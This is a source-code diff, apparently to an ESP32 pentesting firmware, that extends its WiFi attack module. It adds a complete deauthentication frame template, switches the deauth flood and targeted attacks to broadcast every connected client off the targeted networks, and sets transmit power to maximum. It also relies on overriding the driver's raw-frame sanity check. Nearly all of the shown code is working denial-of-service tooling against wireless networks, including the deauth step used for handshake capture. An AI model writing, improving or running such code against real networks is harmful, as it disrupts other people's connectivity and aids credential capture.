@@ -22,7 +22,11 @@
 #define WIFI_ATK_NAME "BruceAttack"
 extern bool showHiddenNetworks;
 
+// Broadcast MAC for flood attacks
+const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
 std::vector<wifi_ap_record_t> ap_records;
+
 /**
  * @brief Decomplied function that overrides original one at compilation time.
  *
@@ -33,6 +37,17 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
     if (arg == 31337) return 1;
     else return 0;
 }
+
+// Complete deauth frame template
+const uint8_t deauth_frame_default[26] = {
+    0xC0, 0x00,                         // Type: Deauthentication, Flags
+    0x3A, 0x01,                         // Duration: 311 microseconds
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast (will be overwritten)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be overwritten)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be overwritten)
+    0x00, 0x00,                         // Sequence control (will be set)
+    0x07, 0x00                          // Reason code: Class 3 frame received from nonassociated STA
+};
 
 uint8_t deauth_frame[sizeof(deauth_frame_default)]; // 26 = [sizeof(deauth_frame_default[])]
 
@@ -76,6 +91,7 @@ const uint8_t beaconPacketTemplate[BEACON_PKT_LEN] = {
     /*107 -108 */ 0x00, 0x00
 };
 // clang-format on
+
 static inline void prepareBeaconPacket(
     uint8_t outPacket[BEACON_PKT_LEN], const uint8_t macAddr[6], const char *ssid, uint8_t ssidLen,
     uint8_t channel, bool setWPAflag = true
@@ -106,9 +122,15 @@ void nextChannel() {
     if (nChannels == 0) return;
     channelIndex = (channelIndex + 1) % nChannels;
     uint8_t ch = channels[channelIndex];
+    
     if (ch >= 1 && ch <= 14) {
         wifi_channel = ch;
-        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
+        esp_err_t err = esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
+        if (err != ESP_OK) {
+            Serial.printf("[CHANNEL] Error setting channel %d: %d\n", ch, err);
+        } else {
+            Serial.printf("[CHANNEL] Switched to channel %d\n", ch);
+        }
     }
 }
 
@@ -117,12 +139,10 @@ void nextChannel() {
 ** @brief: Broadcasts deauth frames
 ***************************************************************************************/
 void send_raw_frame(const uint8_t *frame_buffer, int size) {
-    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    vTaskDelay(1 / portTICK_RATE_MS);
-    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    vTaskDelay(1 / portTICK_PERIOD_MS);
-    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
-    vTaskDelay(1 / portTICK_PERIOD_MS);
+    for (int i = 0; i < 3; i++) {
+        esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+        if (i < 2) vTaskDelay(1 / portTICK_PERIOD_MS); // Small delay between retries
+    }
 }
 
 /***************************************************************************************
@@ -130,24 +150,36 @@ void send_raw_frame(const uint8_t *frame_buffer, int size) {
 ** @brief: prepare the frame to deploy the attack
 ***************************************************************************************/
 void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
-    Serial.print("\nPreparing deauth frame to AP -> ");
-    for (int j = 0; j < 6; j++) {
-        Serial.print(ap_record->bssid[j], HEX);
-        if (j < 5) Serial.print(":");
-    }
-    Serial.print(" and Tgt: ");
-    for (int j = 0; j < 6; j++) {
-        Serial.print(target[j], HEX);
-        if (j < 5) Serial.print(":");
-    }
+    Serial.printf("\n[DEAUTH] Preparing frame on CH%d -> ", chan);
+    Serial.printf("AP: %02X:%02X:%02X:%02X:%02X:%02X, ", 
+                  ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
+                  ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
+    Serial.printf("Target: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                  target[0], target[1], target[2], target[3], target[4], target[5]);
 
     esp_err_t err;
     err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
-    if (err != ESP_OK) Serial.println("Error changing channel");
+    if (err != ESP_OK) {
+        Serial.printf("[DEAUTH] Error changing channel: %d\n", err);
+        return;
+    }
+    
     vTaskDelay(50 / portTICK_PERIOD_MS);
-    memcpy(&deauth_frame[4], target, 6); // Client MAC Address for Station Deauth
-    memcpy(&deauth_frame[10], ap_record->bssid, 6);
-    memcpy(&deauth_frame[16], ap_record->bssid, 6);
+    
+    // Copy MAC addresses to frame
+    memcpy(&deauth_frame[4], target, 6);          // Destination: client/broadcast
+    memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source: AP
+    memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID: AP
+    
+    // Set sequence numbers (increment properly)
+    static uint16_t seq_counter = 0;
+    seq_counter = (seq_counter + 1) & 0xFFF;
+    deauth_frame[22] = (seq_counter >> 4) & 0xFF;
+    deauth_frame[23] = ((seq_counter & 0x0F) << 4) | 0x00;
+    
+    // Set duration (311 microseconds standard)
+    deauth_frame[2] = 0x3A;
+    deauth_frame[3] = 0x01;
 }
 
 /***************************************************************************************
@@ -178,26 +210,40 @@ void wifi_atk_info(String tssid, String mac, uint8_t channel) {
         vTaskDelay(50 / portTICK_PERIOD_MS);
     }
 }
+
 /***************************************************************************************
 ** function: wifi_atk_setWifi
 ** @brief: Sets the Minimum Wifi parameters to WiFi Attacks
 ***************************************************************************************/
 bool wifi_atk_setWifi() {
+    esp_err_t err;
+    
     if (WiFi.getMode() != WIFI_MODE_APSTA) {
-        if (!WiFi.mode(WIFI_MODE_APSTA)) {
+        err = WiFi.mode(WIFI_MODE_APSTA);
+        if (err != ESP_OK) {
+            Serial.printf("[WIFI] Failed to set mode: %d\n", err);
             displayError("Failed starting WIFI", true);
             return false;
         }
         vTaskDelay(pdMS_TO_TICKS(100));
+        Serial.println("[WIFI] Mode set to APSTA");
     }
 
-    if (WiFi.softAPSSID() != bruceConfig.wifiAp.ssid && WiFi.softAPSSID() != WIFI_ATK_NAME) {
-        if (!WiFi.softAP(WIFI_ATK_NAME, emptyString, 1, 1, 4, false)) {
-            displayError("Failed starting  AP Attacker", true);
+    String currentAP = WiFi.softAPSSID();
+    if (currentAP != bruceConfig.wifiAp.ssid && currentAP != WIFI_ATK_NAME) {
+        err = WiFi.softAP(WIFI_ATK_NAME, emptyString, 1, 1, 4, false);
+        if (err != ESP_OK) {
+            Serial.printf("[WIFI] Failed to start AP: %d\n", err);
+            displayError("Failed starting AP Attacker", true);
             return false;
         }
         vTaskDelay(pdMS_TO_TICKS(100));
+        Serial.println("[WIFI] Attack AP started: " + String(WIFI_ATK_NAME));
     }
+    
+    // Set max TX power for better range
+    esp_wifi_set_max_tx_power(78);
+    
     return true;
 }
 
@@ -305,6 +351,11 @@ void wifi_atk_menu() {
     }
     wifi_atk_unsetWifi();
 }
+
+/***************************************************************************************
+** function: deauthFloodAttack
+** @brief: Deauth flood attack targeting all networks
+***************************************************************************************/
 void deauthFloodAttack() {
     if (!wifi_atk_setWifi()) return; // error messages inside the function
 
@@ -328,20 +379,32 @@ ScanNets:
         }
         ap_records.push_back(record);
     }
-    // Prepare deauth frame for each AP record
+    
+    Serial.printf("[FLOOD] Found %d networks to attack\n", nets);
+    
+    // Prepare deauth frame template
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
 
     uint32_t lastTime = millis();
     uint32_t rescan_counter = millis();
     uint16_t count = 0;
     uint8_t channel = 0;
+    
     drawMainBorderWithTitle("Deauth Flood");
+    tft.println("Found " + String(nets) + " networks");
+    tft.println("Frames: 0/s");
+    
     while (true) {
         for (const auto &record : ap_records) {
             channel = record.primary;
-            wsl_bypasser_send_raw_frame(&record, record.primary); // Sets channel to the same AP
+            
+            // Use broadcast MAC for flood attacks
+            wsl_bypasser_send_raw_frame(&record, record.primary, broadcast_mac);
+            
             tft.setCursor(10, tftHeight - 45);
             tft.println("Channel " + String(record.primary) + "    ");
+            
+            // Send frames in bursts
             for (int i = 0; i < 100; i++) {
                 send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                 count += 3;
@@ -349,22 +412,30 @@ ScanNets:
             }
             if (EscPress) break;
         }
+        
         // Update counter every 2 seconds
         if (millis() - lastTime > 2000) {
             drawMainBorderWithTitle("Deauth Flood");
+            tft.println("Found " + String(nets) + " networks");
             tft.setCursor(10, tftHeight - 25);
             tft.print("Frames:               ");
             tft.setCursor(10, tftHeight - 25);
-            tft.println("Frames: " + String(count / 2) + "/s   ");
+            float fps = (count * 1000.0) / 2000.0; // Frames per second
+            tft.println("Frames: " + String((int)fps) + "/s   ");
             tft.setCursor(10, tftHeight - 45);
             tft.println("Channel " + String(channel) + "    ");
             count = 0;
             lastTime = millis();
         }
-        if (millis() - rescan_counter > 60000) goto ScanNets; // re-scan networks for more relability
+        
+        if (millis() - rescan_counter > 60000) {
+            Serial.println("[FLOOD] Rescanning networks...");
+            goto ScanNets; // re-scan networks for more reliability
+        }
 
         if (check(EscPress)) break;
     }
+    
     wifi_atk_unsetWifi();
     returnToMenu = true;
 }
@@ -612,7 +683,8 @@ void capture_handshake(String tssid, String mac, uint8_t channel) {
 
         // If user presses the select button -> send deauth and request redraw
         if (check(SelPress)) {
-            wsl_bypasser_send_raw_frame(&ap_record, channel);
+            // Use broadcast MAC to target all clients
+            wsl_bypasser_send_raw_frame(&ap_record, channel, broadcast_mac);
             for (int i = 0; i < 5; i++) {
                 send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                 vTaskDelay(10 / portTICK_PERIOD_MS);
@@ -661,12 +733,15 @@ AGAIN:
 ** @brief: Deploy Target deauth
 ***************************************************************************************/
 void target_atk(String tssid, String mac, uint8_t channel) {
+    Serial.printf("[TARGET_ATK] Starting attack on %s (CH%d, BSSID: %s)\n", 
+                  tssid.c_str(), channel, mac.c_str());
+    
     // Initialize WiFi attack mode
     if (!wifi_atk_setWifi()) return; // Error messages handled internally
 
-    // Prepare deauth frame
+    // Prepare deauth frame for broadcast (target all stations)
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    wsl_bypasser_send_raw_frame(&ap_record, channel);
+    wsl_bypasser_send_raw_frame(&ap_record, channel, broadcast_mac);
 
     // Attack loop variables
     const uint16_t UPDATE_INTERVAL_MS = 2000;
@@ -696,6 +771,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
             padprintln("AP: " + tssid);
             padprintln("Channel: " + String(channel));
             padprintln(mac);
+            padprintln("Targeting: ALL STATIONS");
             vTaskDelay(50 / portTICK_PERIOD_MS);
             needsRedraw = false;
         }
@@ -739,12 +815,15 @@ void target_atk(String tssid, String mac, uint8_t channel) {
         }
     }
 
+    Serial.println("[TARGET_ATK] Attack stopped");
+    
     // Cleanup
     wifi_atk_unsetWifi();
     returnToMenu = true;
 }
 
 void generateRandomWiFiMac(uint8_t *mac) {
+    mac[0] = 0x02; // Locally administered, unicast
     for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
 }
 
